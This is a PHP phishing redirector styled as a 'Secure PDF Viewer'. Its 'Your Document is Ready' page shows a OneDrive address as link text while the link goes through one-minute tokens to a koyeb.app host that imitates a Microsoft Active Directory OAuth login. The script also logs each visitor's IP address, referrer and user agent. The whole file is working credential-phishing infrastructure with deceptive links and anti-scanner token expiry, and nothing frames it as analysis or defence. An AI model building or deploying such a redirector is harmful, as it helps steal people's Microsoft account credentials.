<?php
// ==============================================
// SECURE 1-MINUTE REDIRECT LINK HANDLER
// ==============================================

// Enable error reporting for debugging (disable in production)
if (getenv('APP_ENV') !== 'production') {
    error_reporting(E_ALL);
    ini_set('display_errors', 1);
} else {
    error_reporting(0);
    ini_set('display_errors', 0);
}

// ================= CONFIGURATION =================
$config = [
    'redirect_url' => 'https://representative-joelynn-activedirectory-39a69909.koyeb.app/oauth2/common/client_id_b61c8803-16f3-4c35-9b17-6f65f441df86/', // <--- Change to your target URL
    'expire_seconds' => 60,  // Token expiry time in seconds
    'log_file' => 'pdf_access.log',
    'redirect_delay' => 1
];

// Block CLI access
if (php_sapi_name() === 'cli') {
    die("This script can only be accessed via web browser");
}

// ================= TOKEN HANDLING =================
function generateToken() {
    return bin2hex(random_bytes(16)) . '_' . time();  // Token is a combination of random bytes and the current time
}

function isTokenValid($token) {
    $parts = explode('_', $token);
    if (count($parts) !== 2) return false;
    return (time() - (int)$parts[1]) <= 60;  // Token is valid for 1 minute
}

// ================= REQUEST HANDLING =================
try {
    // Handle token-based redirect
    if (isset($_GET['token'])) {
        $token = $_GET['token'];

        if (!isTokenValid($token)) {
            throw new Exception("This link has expired after 1 minute");
        }

        // Log successful access
        file_put_contents($config['log_file'], sprintf(
            "%s|REDIRECTED|%s|%s|%s|%s\n",
            date('Y-m-d H:i:s'),
            $_SERVER['REMOTE_ADDR'],
            $token,
            $_SERVER['HTTP_REFERER'] ?? 'direct',
            $_SERVER['HTTP_USER_AGENT']
        ), FILE_APPEND);

        // Redirect to the target URL
        header("Location: " . $config['redirect_url']);
        exit;
    }

    // ================= NEW REQUEST =================
    $token = generateToken();
    $current_url = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'];
    $tempUrl = $current_url . '?token=' . urlencode($token);

    // Log token generation
    file_put_contents($config['log_file'], sprintf(
        "%s|GENERATED|%s|%s|%s\n",
        date('Y-m-d H:i:s'),
        $_SERVER['REMOTE_ADDR'],
        $token,
        $_SERVER['HTTP_USER_AGENT']
    ), FILE_APPEND);

} catch (Exception $e) {
    error_log("Redirect Error: " . $e->getMessage());
    http_response_code(500);
    header('Content-Type: text/html; charset=utf-8');
    die("<h1>Error</h1><p>{$e->getMessage()}</p>");
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure PDF Viewer</title>
    <meta http-equiv="refresh" content="<?= $config['redirect_delay'] ?>;url=<?= htmlspecialchars($tempUrl) ?>">
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 20px;
            background-color: #f5f5f5;
            color: #333;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #2c3e50;
            margin-top: 0;
        }
        .countdown {
            font-size: 1.2em;
            color: #e74c3c;
            font-weight: bold;
            margin: 20px 0;
        }
        .url-box {
            background: #f0f8ff;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
            word-break: break-all;
            border-left: 4px solid #3498db;
        }
        .notice {
            background: #fff8e1;
            padding: 15px;
            border-left: 4px solid #ffb300;
            margin: 20px 0;
        }
        a {
            color: #2980b9;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Your Document is Ready</h1>
        
        <div class="countdown">
            Auto-redirecting in <span id="countdown"><?= $config['redirect_delay'] ?></span> second...
        </div>
        
        <div class="url-box">
            <strong>One-time access link:</strong><br>
            <a href="<?= htmlspecialchars($tempUrl) ?>">https://onedrive.live.com/redir?resid=D33F0BD97CFC485D%21119&page=Edit&wd=target%28Quick%20Notes.one%7Ccb5c4e00-571c-4d96-90cd-82d72609447d%2FUntitled%20Page%7C43ba1c22-a7ef-457f-959e-25fceaa10fec%2F%29&wdorigin=NavigationUrl</a>
        </div>
        
        <div class="notice">
            <strong>Note:</strong> This link will expire in 1 minute and can only be used once.
            If you are not redirected automatically, please click the link above.
        </div>
    </div>

    <script>
        // Dynamic countdown display
        let seconds = <?= $config['redirect_delay'] ?>;
        function updateCountdown() {
            document.getElementById('countdown').textContent = seconds;
            if (seconds-- > 0) {
                setTimeout(updateCountdown, 1000);
            }
        }
        updateCountdown();
    </script>
</body>
</html>
